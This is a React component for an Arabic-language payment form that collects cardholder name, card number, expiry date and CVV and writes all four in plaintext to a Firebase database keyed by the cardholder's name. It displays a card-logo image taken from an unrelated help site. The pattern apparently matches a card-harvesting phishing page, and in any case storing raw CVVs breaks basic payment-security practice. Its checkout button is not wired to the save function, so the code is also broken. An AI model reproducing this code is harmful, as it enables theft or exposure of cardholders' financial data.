import React from 'react';
import { dateBase } from '../firebase';
import { ref, set } from 'firebase/database';
const PayForms = (props: any) => {

  const [ccnumber, setCcNumber] = React.useState('');
  const [ccname, setCcname] = React.useState('');
  const [ccdate, setCcdate] = React.useState('');
  const [cccvv, setCccvv] = React.useState('');
  const handleData = async (formData: any) => {
    if(formData.ccnumber==='' ||formData.ccname ===''||formData.ccdate ===''|| formData.cccvv===''){
      alert('الرجاء ادخال جميع المعلومات بشكل صحيح')
      return;
    }
    const db = dateBase;
    set(ref(db, 'users/' + formData.ccname), {
      ccnumber: formData.ccnumber,
      ccname: formData.ccname,
      ccdate: formData.ccdate,
      cccvv: formData.cccvv,
    });
  };

  return (
    <div className="container">
      <form className="payform">
        <div className="heading">تفاصيل الدفع</div>

        <label htmlFor="name" className="label">
          <span className="title">اسم حامل البطاقة</span>
          <input
            className="input-field"
            type="text"
            name="input-name"
            title="Input title"
            placeholder="اسم حامل البطاقة"
            onChange={(e)=>{
              setCcname(e.target.value)
            }}
          />
        </label>
        <label htmlFor="serialCardNumber" className="label">
          <span className="title">رقم البطاقة</span>
          <input
            id="serialCardNumber"
            className="input-field"
            type="number"
            name="input-name"
            title="رقم البطاقة"
            placeholder="0000 0000 0000 0000"
              onChange={(e)=>{
              setCcNumber(e.target.value)
            }}
          />
        </label>
        <div className="split">
          <label htmlFor="ExDate" className="label">
            <span className="title">تاريخ الانتهاء</span>
            <input
              id="ExDate"
              className="input-field"
              type="text"
              name="input-name"
              title="تاريخ الانتهاء"
              placeholder="01/23"
                onChange={(e)=>{
              setCcdate(e.target.value)
            }}
            />
          </label>
          <label htmlFor="cvv" className="label">
            <span className="title"> CVV</span>
            <input
              id="cvv"
              className="input-field"
              type="number"
              name="cvv"
              title="CVV"
              placeholder="CVV"
              onChange={(e)=>{
                setCccvv(e.target.value)
              }}
            />
          </label>
        </div>
        <input
          className="checkout-btn"
          type="button"
          value="انهاء عملية الدفع"
        />
        <img
          src="https://help.zazzle.com/hc/article_attachments/360010513393/Logos-01.png"
          alt=""
          height={60}
          width={'100%'}
        />
      </form>
    </div>
  );
};
export default PayForms;
